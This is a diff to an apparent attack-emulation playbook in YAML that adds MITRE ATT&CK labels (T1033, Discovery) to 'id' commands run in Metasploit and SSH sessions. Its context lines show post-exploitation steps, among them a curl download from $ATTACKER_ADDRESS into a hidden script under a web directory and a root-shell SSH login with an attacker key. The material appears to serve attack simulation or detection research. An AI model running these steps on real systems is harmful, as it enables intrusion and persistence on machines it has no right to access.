@@ -132,6 +132,9 @@ commands:
     read: True
     cmd: id
     session: "foothold"
+    metadata:
+      techniques: "T1033"
+      tactics: "Discovery"
 
   - type: msf-session
     cmd: curl http://$ATTACKER_ADDRESS/TODO.md > /var/www/default/.zm_preload.sh
@@ -233,6 +236,9 @@ commands:
   - type: msf-session
     cmd: id
     session: "root"
+    metadata:
+      techniques: "T1033"
+      tactics: "Discovery"
 
   - type: msf-session
     session: "root"
@@ -245,6 +251,9 @@ commands:
     cmd: id
     read: True
     session: "root"
+    metadata:
+      techniques: "T1033"
+      tactics: "Discovery"
 
 
 # TODO: THIS COMMAND DOES NOT WORK
@@ -280,6 +289,9 @@ commands:
     key_filename: "/home/aecid/.ssh/attacker_key"
     creates_session: "rootshell"
     clear_cache: True
+    metadata:
+      techniques: "T1033"
+      tactics: "Discovery"
 
   - type: ssh
     cmd: pwd
